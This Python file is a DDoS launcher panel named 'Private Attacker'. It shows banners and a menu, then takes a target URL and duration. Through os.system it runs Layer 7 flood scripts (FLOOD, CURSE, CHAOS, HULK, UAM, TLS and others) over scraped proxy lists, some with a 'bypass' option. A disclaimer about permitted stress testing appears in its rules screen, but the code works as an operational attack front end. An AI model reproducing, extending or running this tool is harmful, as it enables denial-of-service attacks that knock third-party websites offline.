# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
from colorama import Fore, Back, init
import codecs

author = ""

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def menu():
  print('''
\033[31m┌──────────────────────────────────────────────────────────┐  

        ▄█    █▄       ▄████████  ▄█          ▄███████▄      
\033[31m       ███    ███     ███    ███ ███         ███    ███      
\033[31m       ███    ███     ███    █▀  ███         ███    ███      
\033[31m      ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███         ███    ███      
\033[31m     ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ▀█████████▀       
\033[31m       ███    ███     ███    █▄  ███         ███             
\033[31m       ███    ███     ███    ███ ███▌    ▄   ███             
\033[31m       ███    █▀      ██████████ █████▄▄██  ▄████▀           
\033[31m                                 ▀                    
\033[31m└─────────────────────────────────────────────────────────┘   
\033[31m          ║      DEVELOP BY DAXG | @daxg      ║    
\033[31m     ╔═════════════════════════════════════════════╗
                \033[1;94m[\033[0;33m#\033[1;94m] \033[0;31mHELP     \033[1;94m[\033[0;33m#\033[1;94m] \033[0;31mLAYER4   
                \033[1;94m[\033[0;33m#\033[1;94m] \033[0;31mEXIT     \033[1;94m[\033[0;33m#\033[1;94m] \033[0;31mLAYER7 
                \033[1;94m[\033[0;33m#\033[1;94m] \033[0;31mTOOLS    \033[1;94m[\033[0;33m#\033[1;94m] \033[0;31mRULES   
     \033[31m╚═════════════════════════════════════════════╝
              HELP    ►  SHOW HELP MENU
              LAYER4  ►  SHOW LAYER4 METHODS
              LAYER7  ►  SHOW LAYER7 METHODS
              TOOLS   ►  SHOW TOOL BOX
              SCRAPE  ►  PROXY SCRAPER
              EXIT    ►  EXIT TOOL
              CLEAR   ►  CLEAR TERMINAL
''')

def layer7():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""              \x1b[38;2;169;13;245m╔═══════════════════════════════════════════════════════════════════╗
              ║          \x1b[38;2;160;15;245m        ,:::::'       ;           OOO                    ║
              ║          \x1b[38;2;160;15;245m        ::::::;       ;          OOOOO                   ║
              ║          \x1b[38;2;151;16;245m        ;:::::;       ;         OOOOOOOO                 ║
              ║          \x1b[38;2;143;18;246m       ,;::::::;     ;'         / OOOOOOO                ║
              ║          \x1b[38;2;134;20;246m██╗      █████╗ ██╗   ██╗███████╗██████╗ ███████╗        ║
              ║          \x1b[38;2;98;27;247m██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║        ║
              ║          \x1b[38;2;89;28;247m██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ██╔╝        ║
              ║          \x1b[38;2;72;32;248m██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗   ██╔╝         ║
              ║          \x1b[38;2;63;33;248m███████╗██║  ██║   ██║   ███████╗██║  ██║   ██║          ║
              ║          \x1b[38;2;214;4;244m╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝          ║
              ║          \x1b[38;2;214;4;244m `:`:::::::`;:::::: ;::::::#/               DOO          ║
              ║          \x1b[38;2;214;4;244m  :::`:::::::`;; ;:::::::::##                OO          ║
              ║          \x1b[38;2;214;4;244m  ::::`:::::::`;::::::::;:::#                OO          ║
              ║          \x1b[38;2;214;4;244m  `:::::`::::::::::::;'`:;::#                O           ║
              \x1b[38;2;214;4;244m╚═══════════════════════════════════════════════════════════════════╝

                                  \033[32mWELCOME TO \033[33m Private Attacker
                          TYPE [\033[32mMETHODS\x1b[38;2;151;16;245m] [\033[32mURL\x1b[38;2;151;16;245m] [\033[32mTIME\x1b[38;2;151;16;245m] TO START ATTACK
                      ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
                           ●  CHAOS  [\033[32mLayer7\x1b[38;2;151;16;245m]    ●  CURSE   [\033[32mLayer7\x1b[38;2;151;16;245m]
                           ●  TLX    [\033[32mLayer7\x1b[38;2;151;16;245m]    ●  TLS     [\033[32mLayer7\x1b[38;2;151;16;245m]
                           ●  404    [\033[32mLayer7\x1b[38;2;151;16;245m]    ●  BURN    [\033[32mLayer7\x1b[38;2;151;16;245m]
                           ●  FLOOD  [\033[32mLayer7\x1b[38;2;151;16;245m]    ●  KILLER  [\033[32mLayer7\x1b[38;2;151;16;245m]
                           ●  HULK   [\033[32mLayer7\x1b[38;2;151;16;245m]    ●  UAM     [\033[32mLayer7\x1b[38;2;151;16;245m]
                           ●  DAXG   [\033[32mLayer7\x1b[38;2;151;16;245m]
\033[0m""")

def rules():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\033[36m
                                \x1b[38;5;160m╔═══════════════╗
                                \x1b[38;5;160m║     \x1b[38;5;160mRules     \x1b[38;5;160m║
                \x1b[38;5;160m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;5;160m║ \x1b[38;5;160m1. Do not attack without someone's permission \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m3. Do not spam attacks                        \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m4. Only attack stress testing servers         \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m5. Don't skid the panel                       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m6. Give a star to the github repository       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m7. The creator does not do any harm           \x1b[38;5;160m║
                \x1b[38;5;160m╚═══════════════════════════════════════════════╝
""")

def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""     \033[33m WELCOME TO Private Attacker  \033|  \033[36m Telegram : \033[31m @xDAXG
	
              \x1b[38;2;205;6;244m               ...
              \x1b[38;2;196;8;244m              ;::::;
              \x1b[38;2;178;11;245m            ;::::; :;
              \x1b[38;2;169;13;245m          ;:::::'   :;
              \x1b[38;2;169;13;245m         ;:::::;     ;.
              \x1b[38;2;160;15;245m        ,:::::'       ;           OOO
              \x1b[38;2;160;15;245m        ::::::;       ;          OOOOO
              \x1b[38;2;151;16;245m        ;:::::;       ;         OOOOOOOO
              \x1b[38;2;143;18;246m       ,;::::::;     ;'         / OOOOOOO
              \x1b[38;2;134;20;246m     ;:::::::::`. ,,,;.        /  / DOOOOOO
              \x1b[38;2;98;27;247m   .';:::::::::::::::::;,     /  /     DOOOO
              \x1b[38;2;89;28;247m  ,::::::;::::::;;;;::::;,   /  /        DOOO
              \x1b[38;2;72;32;248m ;`::::::`'::::::;;;::::: ,#/  /          DOOO
              \x1b[38;2;63;33;248m :`:::::::`;::::::;;::: ;::#  /            DOOO
              \x1b[38;2;214;4;244m ::`:::::::`;:::::::: ;::::# /              DOO
              \x1b[38;2;214;4;244m `:`:::::::`;:::::: ;::::::#/               DOO
              \x1b[38;2;214;4;244m  :::`:::::::`;; ;:::::::::##                OO
              \x1b[38;2;214;4;244m  ::::`:::::::`;::::::::;:::#                OO
              \x1b[38;2;214;4;244m  `:::::`::::::::::::;'`:;::#                O
              \x1b[38;2;214;4;244m    `:::::`::::::::;' /  / `:#
              \x1b[38;2;214;4;244m     ::::::`:::::;'  /  /   `#")
              

       \033[93m    TYPE\033[36m  [ \033[37mLAYER7 \033[36m ] \033[31mSHOW ALL METHODS DDOS 
    
\033[0m""")

	while True:
		sys.stdout.write(f"\x1b]2;[ \ ] Private-Panel | Online Users: [∞] | Attack Sended: [∞] | Expired: [2025]\x07")
		sin = input(" "+Back.WHITE+Fore.MAGENTA+" root ● D4XG-PA "+Fore.RESET+Back.RESET+" ► ")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main()
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			main()
		if sinput == "help" or sinput == "HELP":
			menu()
		if sinput == "layer7" or sinput == "LAYER7" or sinput == "l7" or sinput == "L7":
			layer7()
		if sinput == "rule" or sinput == "RULES" or sinput == "rules" or sinput == "RULE":
			rules()
		if sinput == "exit" or sinput == "EXIT" or sinput == "kill" or sinput == "KILL":
			sys.exit()
      
		elif sinput == "scrape" or sinput == "SCRAPE":
				os.system(f'cd L7 && python3 scrape.py')
				main()

#########LAYER-7########  
		elif sinput == "FLOOD" or sinput == "flood":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node FLOOD.js {url} {time} 150 250 proxy.txt bypass')
			except ValueError:
				print("Usage: FLOOD <url> <time>")
				print('Example: FLOOD https://example.com 120')
			except IndexError:
				print("Usage: FLOOD <url> <time>")
				print('Example: FLOOD https://example.com 120')

		elif sinput == "CURSE" or sinput == "curse":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node CURSE.js {url} {time} 3 64 proxy.txt')
			except ValueError:
				print("Usage: CURSE <url> <time>")
				print('Example: CURSE https://example.com 120')
			except IndexError:
				print("Usage: CURSE <url> <time>")
				print('Example: CURSE https://example.com 120')
			
		elif sinput == "CHAOS" or sinput == "chaos":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node CHAOS.js {url} {time} 150 150 proxy.txt')
			except ValueError:
				print("Usage: CHAOS <url> <time>")
				print('Example: CHAOS https://example.com 120')
			except IndexError:
				print("Usage: CHAOS <url> <time>")
				print('Example: CHAOS https://example.com 120')

		elif sinput == "KILLER" or sinput == "killer":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node KILLER.js {url} {time} 100 150 proxy.txt')
			except ValueError:
				print("Usage: KILLER <url> <time>")
				print('Example: KILLER https://example.com 120')
			except IndexError:
				print("Usage: KILLER <url> <time>")
				print('Example: KILLER https://example.com 120')

		elif sinput == "HULK" or sinput == "hulk":
			try:
				url = sin.split()[1]
				method = sin.split()[2]
				os.system(f'cd L7 && go run HULK.go -site {url} {method} nil')
			except ValueError:
				print("Usage: HULK <url> <GET/POST>")
				print('Example: HULK https://example.com GET')
			except IndexError:
				print("Usage: HULK <url> <GET/POST>")
				print('Example: HULK https://example.com GET')

		elif sinput == "UAM" or sinput == "uam":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node UAM.js {url} {time} 150')
			except ValueError:
				print("Usage: UAM <url> <time>")
				print('Example: UAM https://example.com 120')
			except IndexError:
				print("Usage: UAM <url> <time>")
				print('Example: UAM https://example.com 120')

		elif sinput == "DAXG" or sinput == "daxg":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node DAXG.js {url} {time} 150 150 proxy.txt')
			except ValueError:
				print("Usage: DAXG <url> <time>")
				print('Example: DAXG https://example.com 120')
			except IndexError:
				print("Usage: DAXG <url> <time>")
				print('Example: DAXG https://example.com 120')

		elif sinput == "TLX" or sinput == "tlx":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node TLX.js {url} {time} 64 4 proxy.txt')
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "BURN" or sinput == "burn":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node BURN.js {url} {time} 64 3 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "TLS" or sinput == "tls":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node TLS.js GET {url} proxy.txt {time} 64 3')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

					

main()
